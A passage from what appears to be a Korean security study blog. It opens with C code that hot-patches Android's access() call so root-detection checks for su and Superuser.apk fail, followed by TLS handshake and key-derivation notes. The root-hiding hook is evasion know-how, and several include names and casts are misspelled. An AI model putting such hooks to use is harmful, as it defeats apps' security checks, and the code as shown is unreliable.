</span><span class='line'>#include &lt;stdio.h&gt;
</span><span class='line'>#include &lt;unistd.h&gt;
</span><span class='line'>#include &lt;fccntl.h&gt;
</span><span class='line'>#include &lt;errono.h&gt;
</span><span class='line'>#include &lt;dlfcn.h&gt;
</span><span class='line'>#include &lt;sys/types.h&gt;
</span><span class='line'>#include &lt;sys/user.h&gt;
</span><span class='line'>#include &lt;sys/mman.h&gt;
</span><span class='line'>#include &lt;sys/syscall.h&gt;
</span><span class='line'>#include &lt;sys/ptrace.h&gt;
</span><span class='line'>#include &lt;sys/wait.h&gt;
</span><span class='line'>#include &lt;linux/user.h&gt;
</span><span class='line'>
</span><span class='line'>#define log(...) fprintf(stdout, __VA_ARGS__)
</span><span class='line'>#define err(...) fprintf(stderr, __VA_ARGS__)
</span><span class='line'>
</span><span class='line'>const unsigned long CPSR_T = 0x00000020u;
</span><span class='line'>
</span><span class='line'>int shim_access(const char * path, int mode)
</span><span class='line'>{
</span><span class='line'>    if (strcmp(path, "/system/app/Superuser.apk") == 0)
</span><span class='line'>        goto err_noent;
</span><span class='line'>    if (strcmp(path, "/system/xbin/su") == 0)
</span><span class='line'>        goto err_noent;
</span><span class='line'>    return syscall(__NR_access, path, mode);
</span><span class='line'>err_noent:
</span><span class='line'>    errno = ENOENT;
</span><span class='line'>    return -1;
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'>#if defined(SHARED)
</span><span class='line'>static void __attribute__((constructor)) init()
</span><span class='line'>{
</span><span class='line'>    log("patching access@%@010x with shim@%#010x...\n", (unsigned) &access, (unsigne) &shim_access);
</span><span class='line'>
</span><span class='line'>    uint32_t * src = (uint32_t *) &access;
</span><span class='line'>    uint32_t * dst = (uint32_t *) &shim_access;
</span><span class='line'>
</span><span class='line'>    size_t range = sysconf(_SC_PAGE_SIZE);
</span><span class='line'>    void * page_base = (void *) ((uint32_t) src & ~(range - 1));
</span><span class='line'>    void * page_end = page_base + range;
</span><span class='line'>
</span><span class='line'>    log("reset memory protection for [%#010x, %#010x[...\n", (unsigned) page_base, (unsigned) page_end);
</span><span class='line'>
</span><span class='line'>    if (mprotect(page_base, range, PROT_READ | PROT_WRITE | PROT_EXEC) != 0)
</span><span class='line'>        exit(EXIT_FAILURE);
</span><span class='line'>
</span><span class='line'>    0x0[src] = ( 0xe59f3000); // ldr r3, [pc]
</span><span class='line'>    0x1[src] = ( 0xea000000); // b +4
</span><span class='line'>    0x2[src] = ((uint32_t) dst); // .word dst
</span><span class='line'>    0x3[src] = ( 0xe12fff13); // bx r3
</span><span class='line'>
</span><span class='line'>    if (mprotect(page_base, range, PROT_READ | PROT_EXEC) != 0)
</span><span class='line'>        exit(EXIT_FAILURE);
</span><span class='line'>    
</span><span class='line'>    log("syscall patched!\n");
</span><span class='line'>}
</span><span class='line'>#endif
</span><span class='line'>
</span><span class='line'>static char * get_image_path()
</span><span class='line'>{
</span><span class='line'>    char buffer[1024];
</span><span class='line'>    char * image_path;
</span><span class='line'>    int length; 
</span><span class='line'>
</span><span class='line'>    length = readlink("/proc/self/exe", buffer, sizeof buffer);
</span><span class='line'>    buffer[length] = '\0';
</span><span class='line'>    asprintf(&image_path, "%s", buffer);
</span><span class='line'>    memcpy(&(strlen(image_path) - strlen("rd-patch"))[image_path], "librd.so", strlen("librd.so") + 1);
</span><span class='line'>    return image_path;
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'>static void dump_registers(struct user_regs * regs)
</span><span class='line'>{
</span><span class='line'>    log(" r0=%#010lx   r1=%#010lx   r2=%#010lx   r3=%#010lx\n", 0x0[regs-&gt;uregs], 0x1[regs-&gt;uregs], 0x2[regs-&gt;uregs], 0x3[regs-&gt;uregs]);
</span><span class='line'>    log(" r4=%#010lx   r5=%#010lx   r6=%#010lx   r7=%#010lx\n", 0x4[regs-&gt;uregs], 0x5[regs-&gt;uregs], 0x6[regs-&gt;uregs], 0x7[regs-&gt;uregs]);
</span><span class='line'>    log(" r8=%#010lx   r9=%#010lx  r10=%#010lx  r11=%#010lx\n", 0x8[regs-&gt;uregs], 0x9[regs-&gt;uregs], 0xa[regs-&gt;uregs], 0xb[regs-&gt;uregs]);
</span><span class='line'>    log("r12=%#010lx   sp=%#010lx   lr=%#010lx   pc=%#010lx\n", 0xc[regs-&gt;uregs], 0xd[regs-&gt;uregs], 0xe[regs-&gt;uregs], 0xf[regs-&gt;uregs]);
</span><span class='line'>    log("            cpsr=%#010lx\n", 0x10[regs-&gt;uregs]);
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/05/09/tls/">TLS</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-05-09T13:54:37+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>9</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>1:54 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><h4>TLS Data Structures</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>struct {
</span><span class='line'>    uint8 major;
</span><span class='line'>    uint8 minor;
</span><span class='line'>} ProtocolVersion;
</span><span class='line'>
</span><span class='line'>enum {
</span><span class='line'>    change_cipher_spec (20),
</span><span class='line'>    alert (21),
</span><span class='line'>    handshake (22),
</span><span class='line'>    application_data (23)
</span><span class='line'>} ContentType;
</span><span class='line'>
</span><span class='line'>struct {
</span><span class='line'>    ContentType type;
</span><span class='line'>    ProtocolVersion version;
</span><span class='line'>    uint16 length;
</span><span class='line'>    opaque fragment[TLSPlaintext.length];
</span><span class='line'>} TLSPlaintext;
</span><span class='line'>
</span><span class='line'>struct {
</span><span class='line'>    HandshakeType msg_type;
</span><span class='line'>    uint24 length;
</span><span class='line'>    HandshakeMessage message;
</span><span class='line'>} Handshake;</span></code></pre></td></tr></table></div></figure>


<h4>Full Handshake</h4>

<ol>
<li>[ClientHello] Client begins a new handshake and submits its capabilities to the server.</li>
<li>[ServerHello] Sever selects connection parameters.</li>
<li>[Certificate] Server sends its certificate chain (only if server authentication is required).</li>
<li>[ServerKeyExchange] Depending on the selected key exchange, the server sends additional information required to generate the master secret.</li>
<li>[ServerHelloDone] Server indicates completion of its side of the negotiation.</li>
<li>[ClientKeyExchange] Client sends additional information required to generate the master secret.</li>
<li>[ChangeCipherSpec] Client switches to encryption and informs the server.</li>
<li>[Finished] Client sends a MAC of the handshake messages it sent and received.</li>
<li>[ChangeCipherSpec] Server switches to encryption and informs the client.</li>
<li>[Finished] Server sends a MAC of the handshake messages it received and sent.</li>
</ol>


<h4>ClientHello</h4>

<ul>
<li>프로토콜 버전은 클라이언트가 지원하는 가장 높은 버전.</li>
<li>그 다음은 랜덤 28 바이트 + 4 바이트 클락.</li>
<li>첫 연결에서는 세션 ID 는 empty. 리쥼할 경우에는 32 바이트. 서버 세션 캐쉬 ID.</li>
<li>그리고 클라이언트에서 지원하는 cipher suites.</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Handshake protocol: ClientHello
</span><span class='line'>    Version: TLS 1.2
</span><span class='line'>    Random
</span><span class='line'>        Client time: May 22, 2030 02:43:46 GMT
</span><span class='line'>        Random bytes: b76b...
</span><span class='line'>    Session ID: (empty)
</span><span class='line'>    Cipher Suites
</span><span class='line'>        Suite: TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
</span><span class='line'>        Suite: TLS_DHE_RSA_WITH_AES_128_GCM_SHA256
</span><span class='line'>        Suite: TLS_RSA_WITH_AES_128_GCM_SHA256
</span><span class='line'>        ...
</span><span class='line'>    Compression methods
</span><span class='line'>        Method: null
</span><span class='line'>    Extensions
</span><span class='line'>        Extension: server_name
</span><span class='line'>            Hostname: www.babo.com
</span><span class='line'>        Extension: renegotiation_info
</span><span class='line'>        Extension: elliptic_curves
</span><span class='line'>            Named curve: secp256r1
</span><span class='line'>            Named curve: secp384r1
</span><span class='line'>        Extension: signature_algorithms
</span><span class='line'>            Algorithm: sha1/rsa
</span><span class='line'>            Algorithm: sha256/rsa
</span><span class='line'>            Algorithm: sha1/ecdsa
</span><span class='line'>            Algorithm: sha256/ecdsa</span></code></pre></td></tr></table></div></figure>


<h4>ServerHello</h4>

<p>옵션들중에서 서버가 선택한 초이스를 클라이언트에게 알려준다.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Handshake protocol: ServerHello
</span><span class='line'>    Version: TLS 1.2
</span><span class='line'>    Random
</span><span class='line'>        Server time: Mar 10, 2059 02:35:57 GMT
</span><span class='line'>        Random bytes: 8469...
</span><span class='line'>    Session ID: 4cae75...
</span><span class='line'>    Cipher Suite: TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
</span><span class='line'>    Compression method: null
</span><span class='line'>    Extensions
</span><span class='line'>        Extension: server_name
</span><span class='line'>        Extension: renegotiation_info</span></code></pre></td></tr></table></div></figure>


<h4>Certificate</h4>

<ul>
<li>서버의 X.509 인증서 체인. ASN.1 DER 인코딩.</li>
<li>서버 인증서가 첫번쨰. 그리고, validation chain 이 주르륵 따라간다. root 는 브라우저에 있으니 생략한다.</li>
<li>선택된 cipher suite 와 호환되는 인증서여야한다.</li>
</ul>


<h4>Finished</h4>

<ul>
<li>verify_data = PRF(master_secret, finished_label, Hash(handshake_message))</li>
</ul>


<h4>Key Exchange</h4>

<ul>
<li>dh_anon, dhe_rsa, ecdh_anon, ecdhe_rsa, ecdhe_ecdsa, krb5, rsa, psk, dhe_psk, rsa_psk, srp</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>struct {
</span><span class='line'>    select (KeyExchangeAlgorithm) {
</span><span class='line'>        case dh_anon:
</span><span class='line'>            ServerDHParams      params;
</span><span class='line'>        case dhe_rsa:
</span><span class='line'>            ServerDHParams      params;
</span><span class='line'>            Signature           params_signature;
</span><span class='line'>        case ecdh_anon:
</span><span class='line'>            ServerECDHParams    params;
</span><span class='line'>        case ecdhe_rsa:
</span><span class='line'>        case ecdhe_ecdsa:
</span><span class='line'>            ServerECDHParams    params;
</span><span class='line'>            Signature           params_signature;
</span><span class='line'>        case rsa:
</span><span class='line'>        case dh_rsa:
</span><span class='line'>            /* no message */
</span><span class='line'>    };
</span><span class='line'>} ServerKeyExchange;</span></code></pre></td></tr></table></div></figure>


<h4>RSA Key Exchange</h4>

<p>굉장히 심플. 클라이언트가 premaster secret (46-byte random number) 를 생성해서, 서버의 public key 로 암호화해서 <code>ClientKeyExchange</code> 메시지로 보낸다. TLS 에서는 <code>RSAES-PKCS1-v1_5</code> 스킴을 사용. Forward secrecy 가 보장이 안되서 문제.</p>

<h4>Diffie-Hellman Key Exchange</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>struct {
</span><span class='line'>    opaque dh_p;
</span><span class='line'>    opaque dh_g;
</span><span class='line'>    opaque dh_Ys;
</span><span class='line'>} ServerDHParams;
</span><span class='line'>
</span><span class='line'>struct {
</span><span class='line'>    select (PublicValueEncoding) {
</span><span class='line'>        case implicit:
</span><span class='line'>            /* empty; used when the client's public parameter is embedded in its certificate */
</span><span class='line'>        case explicit:
</span><span class='line'>            opaque dh_Yc;
</span><span class='line'>    } dh_public;
</span><span class='line'>} ClientDiffieHellmanPublic;</span></code></pre></td></tr></table></div></figure>


<p>Ephemeral Diffie-Hellman (DHE) key exchange 는 파라메터 재사용을 안하는 키교환. 반대로 static DH key exchange 도 있지만, TLS 에서 사용되지는 않는다.</p>

<h4>Elliptic Curve Diffie-Hellman Key Exchange</h4>

<h4>Authentication</h4>

<p>RSA key exchange 에서는 프로토콜을 계속 진행할 수 있다면, 서버가 제시한 인증서의 당사자가 반대편에 있다는 것이 implicit 하게 보장이 된다.</p>

<p>DHE / ECDHE 에서는 서버가 보낸 파라메터에 서명이 딸려온다. 서버의 public key 로 검증할 수 있다.</p>

<h4>Encryption</h4>

<p>Sequence #, Header, Plaintext 를 concat 해서 MAC 을 구해서, Plaintext 에 append 한다. 이 녀석을 encrypt 한 것이 TLS 의 ciphertext. Header + ciphertext 를 전송한다.</p>

<p>Block encryption algorithm 을 사용할 경우 padding 이 들어가는데, Plaintext + MAC + Padding 을 encrypt 하는데, IV 를 generate 한다음에 CBC mode 로 Plaintext + MAC + Padding 을 encrypt 한다. Header + IV + Ciphertext 를 전송한다.</p>

<p>예전에는 전의 ciphertext 를 IV 로 쓰는 chaining 을 했었는데, TLS 1.1 부터 모든 레코드에 IV 가 generate 된다.</p>

<h4>Authenticated Encryption</h4>

<ol>
<li>Generate a unique 64-bit nounce.</li>
<li>Encrypt plaintext with the authenticated encryption algorithm; at the same time feed it the sequence number and record header for it to take into account as additional data for purposes of integrity validation.</li>
<li>Send the nounce and ciphertext together.</li>
</ol>


<p>Authenticated encryption is currently favored as the best encryption mode available in TLS, because it avoids the issues inherent with the MAC-then-encrypt approach.</p>

<h4>PRF</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PRF(secret, label, seed) = P_hash(secret, label + seed)
</span><span class='line'>P_hash(secret, seed) = HMAC_hash(secret, A(1) + seed) + HMAC_hash(secret, A(2) + seed) + ...
</span><span class='line'>A(1) = HMAC_hash(secret, seed)
</span><span class='line'>A(2) = HMAC_hash(secret, A(1))
</span><span class='line'>A(3) = HMAC_hash(secret, A(2))
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<h4>Master Secret</h4>

<p>master_secret = PRF(pre_master_secret, &ldquo;master secret&rdquo;, ClientHello.random + ServerHello.random)</p>

<h4>Key Generation</h4>

<p>key_block = PRF(SecurityParameters.master_secret, &ldquo;key expansion&rdquo;, SecurityParameters.server_random + SecurityParameters.client_random)</p>

<p>The key block is divided into up to six keys: two MAC keys, two encryption keys, two IVs.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/04/28/a-memory-allocator-2/">A Memory Allocator 2</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-04-28T20:49:00+09:00'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>28</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>8:49 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content">
</div>
  
  


    </article>
  
  <div class="pagination">
    
      <a class="prev" href="/posts/9">&larr; Older</a>
    
    <a href="/blog/archives">Blog Archives</a>
    
    <a class="next" href="/posts/7">Newer &rarr;</a>
    
  </div>
</div>
<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2016/06/13/cve-2016-2468/">CVE-2016-2468</a>
      </li>
    
      <li class="post">
        <a href="/blog/2016/05/03/security-analysis-of-emerging-smart-home-applications/">Security Analysis of Emerging Smart Home Applications</a>
      </li>
    
      <li class="post">
        <a href="/blog/2016/04/26/rsa-sample-number/">RSA Sample Number</a>
      </li>
    
      <li class="post">
        <a href="/blog/2016/03/25/bleichenbacher/">Bleichenbacher</a>
      </li>
    
      <li class="post">
        <a href="/blog/2016/03/03/the-drown-attack/">The DROWN Attack</a>
      </li>
    
  </ul>
</section>





  
</aside>

    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2016 - KC -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
